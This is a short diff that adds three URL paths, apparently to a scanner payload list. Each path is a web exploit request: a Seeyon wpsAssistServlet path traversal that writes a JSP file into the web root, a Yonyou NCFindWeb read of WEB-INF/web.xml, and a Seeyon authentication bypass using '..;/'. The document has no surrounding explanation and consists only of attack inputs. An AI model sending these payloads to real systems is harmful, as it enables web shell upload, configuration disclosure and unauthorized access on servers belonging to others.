@@ -1,0 +1,3 @@
+/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2
+/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+/seeyon/thirdpartyController.do.css/..;/ajax.do
